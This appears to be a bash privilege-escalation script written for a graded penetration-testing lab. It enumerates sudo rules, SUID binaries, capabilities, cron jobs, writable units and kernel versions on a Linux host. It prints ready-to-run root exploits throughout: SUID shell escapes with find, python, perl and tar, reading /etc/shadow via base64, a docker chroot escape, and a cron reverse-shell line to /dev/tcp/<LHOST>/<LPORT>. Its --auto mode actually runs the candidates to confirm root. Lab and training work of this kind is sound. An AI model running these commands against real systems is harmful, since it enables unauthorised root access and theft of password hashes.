#!/usr/bin/env bash
# linux_privesc.sh — find local privilege escalation paths, and prove them.
#
# Modes:
#   bash red.sh privesc             enumerate and rank, read only
#   bash red.sh privesc --quiet     findings only, for a narrower screenshot
#   bash red.sh privesc --auto      enumerate AND prove each candidate without a shell
#
# --auto never opens a shell and never writes to system paths. It pushes an `id`
# or a getuid() through each candidate and reports the result, so you know which
# vector to hand-run for the graded screenshot. Hand-run the winner afterwards:
# the report needs your narration, and a script's output reads like a script's.
#
# Verified against the Twin Peaks mock on 2026-11-18. Three binaries carried the
# SUID bit that stock Debian never sets: find, python3.13, base64. That is what
# `chmod u+s` in the wrong hands looks like, so the job of this script is less
# "match a GTFOBins list" and more "flag anything SUID that should not be".

set -u
MODE=enumerate
QUIET=0
case "${1:-}" in
  --quiet) QUIET=1 ;;
  --auto)  MODE=auto ;;
esac

FOUND=0
PROVEN=0
PROOFS=""

hr()  { [ "$QUIET" -eq 0 ] && { echo; echo "---- $* ----"; }; }
hit() { echo "  [VULN] $*"; FOUND=$((FOUND+1)); }
try() { echo "         try: $*"; }

# Binaries that are SUID on a stock Debian install. Anything outside this list is
# the finding. Keep this in sync with the distro you are actually on: on RHEL or
# Alpine the stock set differs, and a false positive costs you a sentence, not a
# grade.
STOCK="dbus-daemon-launch-helper Xorg.wrap ssh-keysign polkit-agent-helper-1 pppd chfn chsh sudo passwd su newgrp gpasswd fusermount3 pkexec mount umount ntfs-3g unix_chkpwd pkexec chage expire sg"

echo "=== linux_privesc.sh  host=$(hostname)  user=$(id -un)  kernel=$(uname -r) ==="
echo "=== uid line: $(id) ==="
[ "$MODE" = auto ] && echo "=== mode: --auto (read only, opens no shells, writes nothing) ==="

# --------------------------------------------------------------- 1. sudo
hr "sudo rules"
if command -v sudo >/dev/null 2>&1; then
  # Never prompt. A script that stops for a password mid-round is worse than one that
  # reports nothing: -n means "do not ask", so this stays silent on a non-sudoer.
  SUDO_OUT="$(sudo -n -l 2>/dev/null)"
  if [ -z "$SUDO_OUT" ]; then
    echo "  no passwordless sudo rule visible."
    echo "  either this account has no sudo, or it wants a password. Not a dead end: the SUID"
    echo "  and sudoers.d sections below are what matter on an unprivileged account."
  else
    echo "$SUDO_OUT" | sed 's/^/  /' | head -20
  fi
  if echo "$SUDO_OUT" | grep -qE '\(ALL(:ALL)?\) (NOPASSWD: )?ALL'; then
    hit "sudo allows everything"
    try "sudo -i    then  id    (expect uid=0)"
  elif echo "$SUDO_OUT" | grep -q 'NOPASSWD'; then
    hit "NOPASSWD sudo entry present"
    echo "$SUDO_OUT" | grep 'NOPASSWD' | sed 's/^/         /'
  elif echo "$SUDO_OUT" | grep -qE '/(find|vim|vi|less|more|awk|man|nano|tar|python3?|perl|env|ftp|gdb)$'; then
    hit "sudo on a binary with a known escape"
    echo "$SUDO_OUT" | grep -E '/(find|vim|less|awk|nano|tar|python3?|perl|env)$' | sed 's/^/         /'
    try "sudo /usr/bin/find / -exec /bin/sh -p \\; -quit"
  fi
  # A drop-in you cannot read may still grant someone else something. Size and
  # name are usually enough to guess: 41 bytes is one short ALL= line.
  if [ -d /etc/sudoers.d ]; then
    UNREAD="$(ls -l /etc/sudoers.d 2>/dev/null | awk 'NR>1 && $1 !~ /^d/ {print $1, $3, $5, $9}')"
    [ -n "$UNREAD" ] && { echo "  drop-ins in /etc/sudoers.d:"; echo "$UNREAD" | sed 's/^/         /'; }
    for f in /etc/sudoers.d/*; do
      [ -f "$f" ] || continue
      [ -r "$f" ] && continue
      hit "unreadable sudo drop-in: $f ($(stat -c %s "$f" 2>/dev/null) bytes)"
      try "read it once you have root: cat $f    (tiny file = likely one NOPASSWD line)"
    done
  fi
else
  echo "  sudo not installed"
  echo "  note: if sudo -l said 'may not run sudo', this account is a plain user and"
  echo "        your privesc has to come from SUID, cron, capabilities or a writable unit."
fi

# --------------------------------------------------------------- 2. SUID
hr "SUID binaries"
SUIDS="$(find / -perm -4000 -type f 2>/dev/null)"
echo "$SUIDS" | sed 's/^/  /' | head -40

UNEXPECTED=""
while IFS= read -r bin; do
  [ -n "$bin" ] || continue
  base="$(basename "$bin")"
  # python3.13, python3.11, perl5.36 ... strip the version suffix before matching
  stem="$(echo "$base" | sed -E 's/(python|perl|ruby|php)[0-9.]+$/\1/')"
  case " $STOCK " in *" $base "*) continue ;; esac
  case " $STOCK " in *" $stem "*) continue ;; esac
  UNEXPECTED="$UNEXPECTED$bin
"
done <<EOF
$SUIDS
EOF

if [ -n "$UNEXPECTED" ]; then
  while IFS= read -r bin; do
    [ -n "$bin" ] || continue
    hit "SUID set on a binary that is not SUID by default: $bin"
    case "$(basename "$bin")" in
      find)          try "$bin / -exec /bin/sh -p \\; -quit" ;;
      python*)       try "$bin -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'" ;;
      base64)        try "$bin /etc/shadow | $bin -d    (file read only, no shell)" ;;
      perl*)         try "$bin -e 'exec \"/bin/sh\", \"-p\"'" ;;
      vim|vi)        try "vim -c ':!/bin/sh'" ;;
      less|more|man) try "$bin /etc/hostname  then  !/bin/sh" ;;
      awk|gawk)      try "awk 'BEGIN {system(\"/bin/sh\")}'" ;;
      nmap)          try "nmap --interactive  then  !sh" ;;
      cp|mv)         try "cp /bin/bash /tmp/rootbash ; chmod +s /tmp/rootbash ; /tmp/rootbash -p" ;;
      tar)           try "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" ;;
      *)             try "look this binary up on GTFOBins before giving up on it" ;;
    esac
  done <<EOF
$UNEXPECTED
EOF
else
  echo "  nothing unexpected. This box is clean on the SUID front."
fi

# ------------------------------------------------- 2b. prove it (--auto)
if [ "$MODE" = auto ]; then
  hr "AUTO PROOF (nothing is modified)"
  if [ -z "$UNEXPECTED" ]; then
    echo "  no unexpected SUID binary to test."
  else
    while IFS= read -r bin; do
      [ -n "$bin" ] || continue
      base="$(basename "$bin")"
      verdict=no
      out=""
      case "$base" in
        find)
          # -maxdepth 0 processes only the starting point, so this is one exec
          out="$("$bin" / -maxdepth 0 -exec /usr/bin/id \; 2>/dev/null)"
          echo "$out" | grep -q 'uid=0' && verdict=full
          [ "$verdict" = no ] && echo "$out" | grep -q 'euid=0' && verdict=effective ;;
        python*|perl*|ruby*)
          out="$("$bin" -c 'import os;print(os.getuid(),os.geteuid())' 2>/dev/null)"
          [ "$out" = "0 0" ] && verdict=full
          [ "$verdict" = no ] && [ "${out##* }" = "0" ] && verdict=effective ;;
        base64|cat|head|tail|less|more|grep)
          if "$bin" /etc/shadow >/dev/null 2>&1; then out="reads /etc/shadow as root"; verdict=read; fi ;;
        *)
          out="not auto-testable here, check GTFOBins by hand" ;;
      esac
      case "$verdict" in
        full)      echo "  [ROOT] $bin -> $out"; PROVEN=$((PROVEN+1)) ;;
        effective) echo "  [ROOT] $bin -> $out   (effective only, run the shell form for a real uid=0)"; PROVEN=$((PROVEN+1)) ;;
        read)      echo "  [READ] $bin -> $out"; PROVEN=$((PROVEN+1))
                   echo "         same trick reads any root-only file: /etc/shadow, /etc/sudoers.d/*, a service config"
                   echo "         e.g.  $bin /etc/sudoers.d/90-blacklodge | $bin -d" ;;
        *)         echo "  [ -- ] $bin -> $out" ;;
      esac
      PROOFS="$PROOFS$bin|$base|$verdict
"
    done <<EOF
$UNEXPECTED
EOF
  fi
  echo
  if [ "$PROVEN" -ge 1 ]; then
    echo "  PROVEN: $PROVEN path(s). Now hand-run two of them for the graded screenshot:"
    echo "$PROOFS" | while IFS='|' read -r bin base out; do
      [ -n "${bin:-}" ] || continue
      case "$base" in
        find)    echo "    $bin / -exec /bin/sh -p \\; -quit   then: id" ;;
        python*) echo "    $bin -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'   then: id; whoami" ;;
        base64)  echo "    $bin /etc/shadow | $bin -d | head -2   (proof of root file read)" ;;
        *)       echo "    $bin  (see GTFOBins)" ;;
      esac
    done
    echo
    echo "  For the report: find gives euid=0(root), python gives uid=0(root)."
    echo "  Say that difference out loud in your writeup, it shows you understood it."
  else
    echo "  Nothing auto-proved. Move to capabilities, cron and writable units below."
  fi
fi

# ---------------------------------------------------------- 3. capabilities
hr "file capabilities"
CAPS="$(getcap -r / 2>/dev/null)"
if [ -n "$CAPS" ]; then echo "$CAPS" | sed 's/^/  /' | head -15
  echo "$CAPS" | grep -q 'cap_setuid' && { hit "capability cap_setuid present"; try "see GTFOBins for that binary"; }
  echo "$CAPS" | grep -qE 'cap_setuid|cap_setgid|cap_dac_read_search' && hit "high-value capability present"
else echo "  none (empty output here means capabilities are not your path)"; fi

# ---------------------------------------------------------------- 4. cron
hr "cron and timers you might write to"
ls -la /etc/cron* 2>/dev/null | head -15
[ -w /etc/crontab ] && { hit "/etc/crontab is writable"; try "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"' >> /etc/crontab"; }
for d in /etc/cron.d /etc/cron.hourly /var/spool/cron/crontabs; do
  [ -w "$d" ] && { hit "$d is world-writable"; }
done
# root running a script that a normal user can edit is the classic cron privesc.
for f in $(grep -rhoE '/[A-Za-z0-9_./-]+\.(sh|py|pl)' /etc/crontab /etc/cron.d/ 2>/dev/null | sort -u); do
  [ -f "$f" ] && [ -w "$f" ] && { hit "root cron runs a script you can write: $f"; try "append a chmod +s /bin/bash line, wait for the schedule"; }
done
systemctl list-timers --all 2>/dev/null | head -8 | sed 's/^/  /'

# ------------------------------------------------- 5. writable units, PATH
hr "writable service files and PATH"
find /etc/systemd/system -writable -type f 2>/dev/null | head -10 | sed 's/^/  [VULN] writable unit: /'
find /usr/lib/systemd/system -writable -type f 2>/dev/null | head -5 | sed 's/^/  [VULN] writable unit: /'
IFS=:; for d in $PATH; do [ -w "$d" ] && hit "PATH directory writable: $d"; done; unset IFS

# ------------------------------------------------------- 6. other classics
hr "other classic vectors"
[ -w /etc/passwd ] && hit "/etc/passwd writable (add a uid 0 user)"
[ -r /etc/shadow ] && hit "/etc/shadow readable"
id -nG 2>/dev/null | grep -qw docker && { hit "member of docker group"; try "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"; }
id -nG 2>/dev/null | grep -qw lxd  && hit "member of lxd group"
grep -q 'no_root_squash' /etc/exports 2>/dev/null && hit "NFS export with no_root_squash"
find / -name '*.bak' -o -name '*~' -o -name '*.old' 2>/dev/null | grep -vE '/(proc|sys|usr/share)' | head -5 | sed 's/^/  candidate backup file: /'
# World-writable directories owned by root: a service that writes there can be
# fed content, or you can drop a file the service later executes.
find / -xdev -type d -perm -0002 ! -path '/tmp/*' ! -path '/var/tmp/*' -not -path '/proc/*' 2>/dev/null | head -8 | sed 's/^/  world-writable dir: /'
# Anonymous FTP upload directory is a foothold and a delivery point, not a privesc.
[ -d /home/ftp ] && ls -ld /home/ftp/* 2>/dev/null | grep -q 'rwxrwxrwx' && hit "/home/ftp has a world-writable subdirectory (FTP upload point)"

# ------------------------------------------------------------ 7. kernel
hr "kernel and likely CVEs"
echo "  kernel $(uname -r)"
K="$(uname -r)"
case "$K" in
  5.8*|5.9*|5.10*|5.11*|5.12*|5.13*|5.14*|5.15*|5.16*) echo "  [!] possible Dirty Pipe range (5.8 to 5.16.x)" ;;
  5.[0-7]*|4.*) echo "  [!] possible PwnKit / Baron Samedit era, check pkexec and sudo versions" ;;
esac
if command -v pkexec >/dev/null 2>&1; then echo "  pkexec version: $(pkexec --version 2>&1 | head -1)"; fi
echo "  sudo version:   $(sudo --version 2>/dev/null | head -1)"

# -------------------------------------------------------------- summary
echo
echo "=== SUMMARY: $FOUND candidate path(s), $PROVEN proven ==="
echo "Pick two different ones for the report. For each, capture: the finding, the command, and id showing root."
echo "Do not run anything that writes to system paths until you have your screenshots of the enumeration."
